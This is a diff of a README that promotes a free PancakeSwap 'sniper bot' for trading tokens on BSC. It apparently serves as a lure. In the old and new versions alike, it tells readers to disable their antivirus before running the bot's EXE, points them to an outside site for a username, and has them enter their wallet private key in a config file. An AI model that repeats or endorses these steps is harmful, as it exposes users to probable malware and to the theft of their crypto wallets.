@@ -1,12 +1,16 @@
-<h2>pancakeswap sniper bot Free</h2>
-  * Get Your username and offer 50% code: SYBOT50 from: http://pancakesbot.com/ <br/>
-  * Disable your antivirus Before open bot, because some EXE file is not install package will be block <br/>
-<br/>##Warning: We do not engage in any way with your profit or loss or your money. It only free or paid package
+<h1>Free pancakeswap sniper bot</h1>
+  
+* Get Your username from: http://pancakesbot.com/
+  
+* Disable your antivirus Before open bot, because some EXE file is not install package will be block
+
+
 
 ## NOW THE BOT IS POSSIBLE FOR BSC: PANCAKESWAP (DEFAULT)
   YOU CAN USE TO ANY DEFI SAME UNISWAP V2 AND PANCAKESWAP V2, BUT YOU NEED TO CHANGE pairabi, pancakeABI AND pancakeSwapFactoryABI
 
  
+
 ## IMPORTANT NOTES BEFORE RUNNING THE BOT
  CHECK TOKEN YOU WANT TO SNIPER IT NOT SCAM OR HONEYPOT OR SNIPER PROTECTION TOKEN (90% NEW TOKEN CAN BE SCAM)
 
@@ -30,8 +34,8 @@ To avoid scam, I will invite you to my private repository, aTo avoid scam, I wil
 ## HOW TO RUN
 1. set up your config.py to with this explanation : 
 ----------------------------------------------------------
-- walletAddress = "0x0000000000000000000000000000000000000000"                     #Your Wall address From trustwallet or another wallet.
-- private_key = "x000000000000000000000000000000000000000000000000000000000000000" #Wallet private_key
+- walletAddress = "Your_wallet"                     #Your Wall address From trustwallet or another wallet.
+- private_key = "Wallet_private_key" #Wallet private_key
 
 - spend = "0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c"  # WBNB OR OTHER contract for buy the token
 
